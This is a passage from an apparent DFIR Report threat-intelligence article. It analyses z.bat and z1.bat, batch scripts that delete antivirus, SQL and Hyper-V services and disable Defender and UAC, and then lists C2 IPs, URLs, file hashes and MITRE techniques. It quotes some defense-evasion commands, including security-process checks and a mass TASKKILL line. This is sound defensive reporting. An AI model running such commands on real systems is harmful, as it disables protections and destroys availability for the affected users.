<p><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_065.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37195" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_065.png" alt="" width="452" height="596" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_065.png 452w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_065-228x300.png 228w" sizes="(max-width: 452px) 100vw, 452px" /></a></p>



<p>Reference:</p>



<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://www.virustotal.com/gui/file/1aecadf489a6dd7a3a6e5dfda9425673a9d04d38a5cb6b0b8f961536c11237ed/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/1aecadf489a6dd7a3a6e5dfda9425673a9d04d38a5cb6b0b8f961536c11237ed/detection</a></div>
</figure>



<figure class="wp-block-embed is-type-wp-embed is-provider-immersive-labs wp-block-embed-immersive-labs">
<div class="wp-block-embed__wrapper"><a href="https://www.immersivelabs.com/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide/" target="_blank" rel="noopener">https://www.immersivelabs.com/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide/</a></div>
<div> </div>
</figure>



<h3 id="c25" class="wp-block-heading"><strong>z.bat</strong></h3>



<p>This script contains 242 lines of code that mainly performs the deletion of services. These are divided into some of the different AV vendors, Hyper-V, and SQL, based on the below categories.</p>



<pre class="wp-block-preformatted">rem Delite Service "Hyper-V"
rem Delite Service "AVG"
rem Delite Service "Malwaresbytes"
rem Delite Service "Sofos"
rem Delite Service "Fire_Bird"
rem Delite Service "SQL"
rem Delite Service "AV: Webroot"
rem Delite Service "AV: ESET"
rem Delite Service "AV: Kaspersky"
rem Delite Service "AV: Quick Heal"
rem Delite Service "AV: McAfee"
rem Delite Service "AV: Trend Micro"
rem Delite Service "AV: Panda"
</pre>



<p>Aside from deletion of services, it also performs the killing of multiple processes.</p>



<pre class="wp-block-preformatted">rem Kill
rem Kill "AV: Trend Micro"
rem Kill "SQL"
</pre>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_066.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37196" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_066.png" alt="" width="2464" height="638" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_066.png 2464w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_066-300x78.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_066-1024x265.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_066-768x199.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_066-1536x398.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_066-2048x530.png 2048w" sizes="(max-width: 2464px) 100vw, 2464px" /></a></figure>



<p>These commands are used to check if specific antivirus or endpoint security services are running on a Windows system.</p>



<ol class="wp-block-list">
<li>tasklist /fi &#8220;imagename eq MsMpEng.exe&#8221;: This checks if the process for Windows Defender (MsMpEng.exe) is running.</li>



<li>| find /c &#8220;PID&#8221;: This part filters the previous command&#8217;s output, counting how many lines contain the term &#8220;PID&#8221; (a way to check if the process was found).</li>



<li>&amp;&amp; Echo Windows Defender: If the previous command found the process (meaning Windows Defender is running), this part will display &#8220;Windows Defender&#8221;.</li>
</ol>



<p>The same structure applies to the other lines, but they check for different processes:</p>



<ul class="wp-block-list">
<li>MBCloudEA.exe &amp; MBAMService.exe &#8211; Malwarebytes</li>



<li>ntrtscan.exe &#8211; Trend Micro Security.</li>



<li>avp.exe &#8211; Kaspersky Endpoint Security.</li>



<li>WRSA.exe &#8211; Webroot.</li>



<li>egui.exe &#8211; ESET.</li>



<li>AvastUI.exe f &#8211; Avast.</li>
</ul>



<pre class="wp-block-preformatted">TASKKILL /F /FI "PID ge 1000" /FI "WINDOWTITLE ne untitle*"
</pre>



<p>The last command on this script is used to forcefully stop all processes with a PID of 1000 or higher, except those whose window titles start with &#8220;untitle&#8221;.</p>



<h3 id="c26" class="wp-block-heading"><strong>z1.bat</strong></h3>



<p>This is by far the most extensive script on this opendir, and it contains over 772 lines of commands. It has exactly the same content of the previous script (z.bat) with additional defense evasion techniques and capabilities.</p>



<pre class="wp-block-preformatted">rem Delite Service "Hyper-V"
rem Delite Service "AVG"
rem Delite Service "Malwaresbytes"
rem Delite Service "Sofos"
rem Delite Service "Fire_Bird"
rem Delite Service "SQL"
rem Delite Service "AV: Webroot"
rem Delite Service "AV: ESET"
rem Delite Service "AV: Kaspersky"
rem Delite Service "AV: Quick Heal"
rem Delite Service "AV: McAfee"
rem Delite Service "AV: Trend Micro"
rem Delite Service "AV: Panda"
</pre>



<p>The first part of the script deletes services targeting well-known security AV vendors, as well as services related to Hyper-V and Microsoft SQL.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_067.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37197" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_067.png" alt="" width="1320" height="2300" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_067.png 1320w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_067-172x300.png 172w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_067-588x1024.png 588w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_067-768x1338.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_067-882x1536.png 882w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_067-1175x2048.png 1175w" sizes="(max-width: 1320px) 100vw, 1320px" /></a></figure>



<p>Second part of the script is to stop multiple services related to MS SQL, as well as disable the related services via &#8220;sc config&#8221; command.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_068.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37198" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_068.png" alt="" width="1600" height="2294" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_068.png 1600w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_068-209x300.png 209w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_068-714x1024.png 714w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_068-768x1101.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_068-1071x1536.png 1071w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_068-1428x2048.png 1428w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></figure>



<p>These commands delete registry entries for various antivirus and security services from the Windows Registry. By targeting the HKLM\SYSTEM\CurrentControlSet\services\ path, they remove configurations for security software such as Kaspersky, Malwarebytes, McAfee, Norton, Avast, AVG, Avira, and many others, effectively disabling these services.</p>



<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2024/08/26297_069.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37199" src="https://thedfirreport.com/wp-content/uploads/2024/08/26297_069.png" alt="" width="2894" height="618" srcset="https://thedfirreport.com/wp-content/uploads/2024/08/26297_069.png 2894w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_069-300x64.png 300w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_069-1024x219.png 1024w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_069-768x164.png 768w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_069-1536x328.png 1536w, https://thedfirreport.com/wp-content/uploads/2024/08/26297_069-2048x437.png 2048w" sizes="(max-width: 2894px) 100vw, 2894px" /></a></figure>



<p>This part of the script has already been discussed in previous scripts. These are mainly related to Windows settings to enable Remote Desktop, adjust firewall rules, alter the behavior of certain utility programs, and change security policies. Specifically, they allow Remote Desktop connections, create a firewall rule to allow incoming Remote Desktop traffic, and replace the functions of various accessibility tools and Help features with the Command Prompt. Additionally, they disable UAC and Windows Defender and modify Remote Desktop, potentially weakening system security.</p>



<h2 id="victim" class="wp-block-heading"><a href="#victim">Victim</a></h2>



<p>During the analysis of the open directories identified in this investigation no information was discovered relating to targeting or victims.</p>



<h2 id="iocs" class="wp-block-heading"><a href="#iocs">Indicators</a></h2>



<h3 class="wp-block-heading">Atomic</h3>



<pre class="wp-block-preformatted">PoshC2 IP Address:
94.198.53.143
185.234.216.64

Extracted C2 URLs:
/webhp/
/adsense/troubleshooter/1631343/
/trader-update/history&amp;pd=/
/status/995598521343541248/query=/
/uasclient/0.1.34/modules/
/utag/lbg/main/prod/utag.15.js/
/GoPro5/black/2018/
/usersync/tradedesk/
/bootstrap/3.1.1/bootstrap.min.js/
/TOS/
/business/home.asp&amp;ved=/
/web/20110920084728/
/vssf/wppo/site/bgroup/visitor/
/Philips/v902/
/bh/sync/aol/
/async/newtab/
/advanced_search/
/adServingData/PROD/TMClient/6/8736/
/vfe01s/1/vsopts.js/
/cisben/marketq/
/business/retail-business/insurance.asp/
/client_204/
/branch-locator/search.asp/
/work/embedded/search/
/babel-polyfill/6.3.14/polyfill.min.js=/
/cdba/
/putil/2018/0/11/po.html/
/qqzddddd/2018/load.php/
/types/translation/v1/articles/
/classroom/sharewidget/widget_stable.html/<br /><br />SystemBC IP addresses:<br />94.198.55.181:4337<br />94.198.51.247:4337</pre>



<h3 class="wp-block-heading">Computed</h3>



<pre class="wp-block-preformatted">atera_del.bat
754e08c93369e5bfe24ca09b422affdd
591379f5d7d256e83de05207fd872acfa8e8aa5e
ea7dec8fa52d2300350367691ae2fbea13dbd5bf80d6b43b05eedf197529aa77

atera_del2.bat
3c1853831958efe2cc78ea82b4fbd565
dc14cffa48dd95157fd381cb75bae1773d510c54
512beb7dfa9fdbc8be7fbf59c7bec7911296f9e36c8a3d3b95e7aef4a88bf09c

backup.bat
91be6e6a8b4c2cb99db5b99d40e06978
86f599090aa2c7c1df65dccccf00e1818e72246a
beb5022543a1e12e1f8f5ffe5d520e5fc9cf623aea512cfb43ea2f8c2897420c

clearlog.bat
f7a730acc86f1d6759249ccc579b1794
fe1fb1da6435a6d6283e993569d3fc82a67d7ac8
09f91e90a1604a633c00d6039581f552603421356cb1edb62e085b32ff01b94e

cmd.cmd
5336dffb778b1e2a0b982b337652b213
bd65b5306914187f14bfffa995e7e68a8d036d0c
4106ce787cf73d7f8215311a241f0e42426301a5a2078da9e3349afade2df684

def1.bat
1393dab192ea2e2427889839a2d8fcf7
373609c0f30ee313fd0cc6c4e572452483d87244
0e626e01d3ae7840aa486468f40138284ccbd70dfe336a6b5d4008d01eb79988

defendermalwar.bat
1365640fc3c0e1824e348956172caed7
300c89889bbb5ef61f470174a6fcad73c4516779
5b43428452a867ad61554d763c8f19ca4cd8af8c31194304785e9e45f9258441

delbackup.bat
a8b335886e39adf23e6aa44a00bf82dc
2de53c24663149366fca22f354aff5c0f5b348f4
6cff22a3ea7c054075b9aded5933587bf997623183539e10e426d103d604f046

disable.bat
cc35c94e64830ff143b54783c9869ecf
4a8a4e6069ec4f6a4f24614eb885c57484bc9b79
fdc105ae79dff83f31777c6e047272c5b372251a3af49e20370e7ee9d1c70763

hyp.bat
d1e3216cf698a58832d947d95dc4f3f8
1224f9667d7f1d3b7fba17f414d343912bec03db
08d40a402b3754e52e4e86003bffddfdccbceefd335f53591f4cf715f8d30321

LOGOFALL.bat
9a66570b7e25035ff337fa6098f59823
a65d7caf354161798d2458cfee9e4e988f0e94af
03b3c37300bf9dcfaa4594e86841b70263324dda305484fb268b27deb09f936c

LOGOFALL1.bat
c84e1655f0ba917cc605018e32eba9f3
7dee2a38cc2ba81cc373b50f42c8946601d177cb
3691dbb1834db4eb8ef4c195d26779b87db267a56f2ebca6c146a53fb8adb9c0

native_dropper
444d7a27ac0327ccc0cf4e75a32025c9
8441e7b6b6b9f24439e71c6b031262bc76d73c28
039bf780ae46875945344af489a590c5b7a36d458372a3173b55b3dc3559dfff

NG1.bat
aae5ca4d0e7f000ba5f5250caaed0a05
d08878d7dffe082a908a4bb6387b4739c1a9d3eb
7e623f907b4a4c924cd8af3bf4b8df45b6f904723cbb26ec87cfe7792388afe1

NG2.bat
1a4e569f50695f53bd2368cc322a792d
0a99bd83472444e1bfdd53385fbf2e95bb6dbab9
d97e2e5e6b23ee0f1efa7326d7ac3240a0df9770bf7c2992eec890f073c9cada

ngrok.exe
e2eadf60d8f25cae9b29decab461177b
cecc54143cc375af1b9aed0021643b179574e592
1b60097bf1ccb15a952e5bcc3522cf5c162da68c381a76abc2d5985659e4d386

ON.bat
8c7c782df59edd61aabbc510d7747b11
66ac6cf4bb4247daf1d09d9d4bc4e357cc39c6c8
b0056bef817408449470d3fa43e13cbc89cabdae795b1dc8cbe9905c5946f530

Posh_v2_dropper_x64.exe
a5748047ebbe34d7821a2a040e4ca54e
55126d8215b771aa2f62f16e6aad9e8832824a4c
63229da1bed0c0eafc4ed087651af3eec521e7fbd098300f7d862582d03a675d

py_dropper.sh
679d0dab79a98da8e20351f9f887e4f2
9442647283e52c91c2e836b19749f184936cf6c2
01ec91a3145332174eef9239f7767adaa5e3dff3a436dfb7d2f978f88ea6cd93

setup_uncnow.msi (Atera Remote Admin)
c8903eb5763c670a15049d74d764188c
990f68cca516192d73ef443f51ed80813e324b0b
91d9c73b804aae60057aa93f4296d39ec32a01fe8201f9b73f979d9f9e4aea8b

shadow.bat
4cf52cee2001cd10528f429fb6d9fd07
3cf331934996ec4338418b847b52d78d8a29d224
87ab1707a553557b10fa721a32f053fbb40d11de6f692e96e067d03316fe530b

shadowGuru.bat
0f1290d014dfd9e66bbbed96a828f7d1
b8fc0194f6ed56e4a57c16756e506369c74c4078
2bcd5702a7565952c44075ac6fb946c7780526640d1264f692c7664c02c68465

VmManagedSetup.exe (SystemBC proxy malware)
7ee103ee99b95c07cc4a024e4d0fdc03
885fc76ba1261a1dcce87f183a2385b2b99afd96
cc4960939a41d6a281ddad307b107e16214f4aeda261c9b5037f26e60dc7bba2

WILD_PRIDE.exe (Sliver C2)
6b44d99b258c275ee7fcf230da177f3e
833a461f6d479d164b453cc9f5f51259d991b1b7
1aecadf489a6dd7a3a6e5dfda9425673a9d04d38a5cb6b0b8f961536c11237ed

z1.bat
97dc80d3844b01587d9fd6377b9ab0a7
93b717a562f2cc3fdf2355bd9d2670ba2391cc60
a668a98e57c03decf6ea76bb32f67f3f077ef2277e57f4117d44f4342977fddf

z.bat
fe00973fc12b3c6330abd9807dfb1d70
d2f5c890e3e1dd9b42e695586c06408b31d4ec7a
38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955
</pre>



<h2 class="wp-block-heading">MITRE</h2>



<pre class="wp-block-preformatted">Accessibility Features - T1546.008
Account Access Removal - T1531
Application Layer Protocol - T1071
Asymmetric Cryptography - T1573.002
Clear Windows Event Logs - T1070.001
Deobfuscate/Decode Files or Information - T1140
Disable or Modify Tools - T1562.001
Disable Windows Event Logging - T1562.002
Encrypted Channel - T1573
Inhibit System Recovery - T1490
Modify Registry - T1112
PowerShell - T1059.001
Proxy - T1090
Python - T1059.006
Registry Run Keys / Startup Folder - T1547.001
Remote Access Software - T1219
Service Stop - T1489
System Owner/User Discovery - T1033
Web Protocols - T1071.001
Windows Command Shell - T1059.003
</pre>
<p><a href="https://thedfirreport.com/wp-content/uploads/2025/09/26297_070_1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-37243" src="https://thedfirreport.com/wp-content/uploads/2025/09/26297_070_1.png" alt="" width="2056" height="2682" srcset="https://thedfirreport.com/wp-content/uploads/2025/09/26297_070_1.png 2056w, https://thedfirreport.com/wp-content/uploads/2025/09/26297_070_1-230x300.png 230w, https://thedfirreport.com/wp-content/uploads/2025/09/26297_070_1-785x1024.png 785w, https://thedfirreport.com/wp-content/uploads/2025/09/26297_070_1-768x1002.png 768w, https://thedfirreport.com/wp-content/uploads/2025/09/26297_070_1-1177x1536.png 1177w, https://thedfirreport.com/wp-content/uploads/2025/09/26297_070_1-1570x2048.png 1570w" sizes="(max-width: 2056px) 100vw, 2056px" /></a></p>
<p>Internal case #AI26297 PR31059</p>


<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-37127" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-37127" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/?share=linkedin" target="_blank" title="Click to share on LinkedIn" ><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared="" class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/?share=reddit" target="_blank" title="Click to share on Reddit" ><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-37127" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared="" class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp" ><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id='jp-relatedposts' class='jp-relatedposts' >
	<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
	</div><!-- .entry-content -->

	
		<footer class="entry-footer">
			<div class="entry-meta">

							</div><!-- .entry-meta -->
		</footer><!-- .entry-footer -->
			
		</div><!-- .entry-content-holder -->
</article><!-- #post-37127 -->

	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/" rel="prev">IcedID Brings ScreenConnect and CSharp Streamer to ALPHV Ransomware Deployment</a></div><div class="nav-next"><a href="https://thedfirreport.com/2024/08/26/blacksuit-ransomware/" rel="next">BlackSuit Ransomware</a></div></div>
	</nav>
		</main><!-- #main -->
	</div><!-- #primary -->


<aside id="secondary" class="widget-area">
	<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block">	<div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="175340963"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									class="no-border-radius "
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="175340963"/>
							<input type="hidden" name="source" value="https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value=""/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="1265e6b2da" /><input type="hidden" name="_wp_http_referer" value="/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/" /><input type="hidden" name="post_id" value="37127"/>							<button type="submit"
																	class="wp-block-button__link no-border-radius"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt="" class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt="" class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt="" class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt="" class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt="" class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt="" class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside><!-- #secondary -->
</div><!-- .wrap .wrap-width-->
		</div><!-- .site-content-cell -->
	</div><!-- #content -->
	
	<footer id="colophon" class="site-footer" role="contentinfo">

			
		<div class="copyright-area">
			<div class="wrap">
								<div class="site-info">
					    <a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved				</div><!-- .site-info -->
												<div class="footer-right-info">
															</div>
									</div><!-- .wrap -->
		</div><!-- .copyright-area -->
	</footer><!-- #colophon -->
			<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
	</div><!-- #page -->


	<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="6a763440a26db97cfd8463be-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2024\/08\/12\/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts\/":37127};
	</script>
				<style id='jetpack-block-subscriptions-inline-css' type='text/css'>
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form 